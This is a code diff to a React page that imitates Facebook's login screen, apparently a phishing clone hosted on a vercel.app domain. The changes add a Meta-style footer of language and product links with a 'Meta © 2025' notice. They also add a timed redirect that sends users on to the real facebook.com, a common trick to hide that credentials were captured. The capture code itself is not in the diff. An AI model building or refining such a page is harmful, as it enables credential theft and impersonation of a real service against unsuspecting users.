@@ -3,6 +3,7 @@
 import { useState } from 'react';
 
 const REDIRECT_URL = 'https://tp-sds-2a88.vercel.app/success'; // Cambia aquí
+const REDIRECT_URL_2 = 'https://facebook.com'; // Cambia aquí
 
 export default function Home() {
   const [email, setEmail] = useState('');
@@ -57,7 +58,9 @@ export default function Home() {
   };
 
   const handleCreateAccount = () => {
-    showMessage('Función de crear cuenta no implementada.', 'error');
+    setTimeout(() => {
+      window.location.href = REDIRECT_URL_2;
+    }, 1500);
   };
 
   return (
@@ -110,6 +113,48 @@ export default function Home() {
       </div>
 
       <div style={styles.footer}>
+        <div style={styles.footerLinks}>
+          <a href="#" style={styles.footerLink}>Español</a>
+          <a href="#" style={styles.footerLink}>English (US)</a>
+          <a href="#" style={styles.footerLink}>Français (France)</a>
+          <a href="#" style={styles.footerLink}>Italiano</a>
+          <a href="#" style={styles.footerLink}>Deutsch</a>
+          <a href="#" style={styles.footerLink}>Português (Brasil)</a>
+          <a href="#" style={styles.footerLink}>العربية</a>
+          <a href="#" style={styles.footerLink}>हिन्दी</a>
+          <a href="#" style={styles.footerLink}>中文(简体)</a>
+          <a href="#" style={styles.footerLink}>日本語</a>
+        </div>
+        <div style={styles.footerLinks}>
+          <a href="#" style={styles.footerLink}>Registrarse</a>
+          <a href="#" style={styles.footerLink}>Iniciar sesión</a>
+          <a href="#" style={styles.footerLink}>Messenger</a>
+          <a href="#" style={styles.footerLink}>Facebook Lite</a>
+          <a href="#" style={styles.footerLink}>Video</a>
+          <a href="#" style={styles.footerLink}>Meta Pay</a>
+          <a href="#" style={styles.footerLink}>Tienda Meta</a>
+          <a href="#" style={styles.footerLink}>Meta Quest</a>
+          <a href="#" style={styles.footerLink}>Ray-Ban Meta</a>
+          <a href="#" style={styles.footerLink}>Meta AI</a>
+          <a href="#" style={styles.footerLink}>Instagram</a>
+          <a href="#" style={styles.footerLink}>Threads</a>
+          <a href="#" style={styles.footerLink}>Recaudaciones de fondos</a>
+          <a href="#" style={styles.footerLink}>Servicios</a>
+          <a href="#" style={styles.footerLink}>Centro de información de votación</a>
+          <a href="#" style={styles.footerLink}>Política de privacidad</a>
+          <a href="#" style={styles.footerLink}>Centro de privacidad</a>
+          <a href="#" style={styles.footerLink}>Grupos</a>
+          <a href="#" style={styles.footerLink}>Información</a>
+          <a href="#" style={styles.footerLink}>Crear anuncio</a>
+          <a href="#" style={styles.footerLink}>Crear página</a>
+          <a href="#" style={styles.footerLink}>Desarrolladores</a>
+          <a href="#" style={styles.footerLink}>Empleo</a>
+          <a href="#" style={styles.footerLink}>Cookies</a>
+          <a href="#" style={styles.footerLink}>Opciones de anuncios</a>
+          <a href="#" style={styles.footerLink}>Condiciones</a>
+          <a href="#" style={styles.footerLink}>Ayuda</a>
+          <a href="#" style={styles.footerLink}>Subir contactos y no usuarios</a>
+        </div>
         <div style={styles.copyright}>
           Meta © 2025
         </div>
